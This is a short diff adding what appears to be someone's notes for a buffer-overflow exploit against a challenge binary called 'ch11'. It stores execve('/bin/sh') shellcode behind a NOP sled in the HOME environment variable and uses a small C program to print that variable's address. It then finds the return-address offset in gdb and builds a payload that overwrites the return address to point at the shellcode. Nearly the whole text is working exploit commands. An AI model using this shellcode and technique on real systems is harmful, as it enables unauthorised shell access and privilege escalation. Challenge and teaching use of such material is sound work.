@@ -1,0 +1,37 @@
+cd /tmp
+touch /tmp/youh
+mkdir lol
+cd lol
+vim prog.c
+
+#include <stdio.h>
+
+int main()
+{
+		 char* env = getenv("HOME");
+		         if (env)
+					                 printf("ADRESS %p\n", (void*)env);
+									 	return 0;
+}
+
+gcc prog.c
+
+cd
+
+export HOME=$(printf '\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')
+
+/tmp/lol/a.out
+
+0xbfffff6e
+--> \x6e\xff\xff\xbf
+
+python -c 'print("\x90\x90\x90\x90" + "/" + "T"*136 + "ABCDEFGHIJKLMNOPQRSTUVWXYZ")' > /tmp/youh
+gdb ch11
+run /tmp/youh
+ex:
+Cannot access memory at address 0x48474645
+0x48474645 in ?? ()
+convert to ascii : HGFE
+
+
+python -c 'print("\x90\x90\x90\x90" + "/" + "T"*136 + "\x6e\xff\xff\xbf"*4+"OPQRSTUVW")' > /tmp/youh
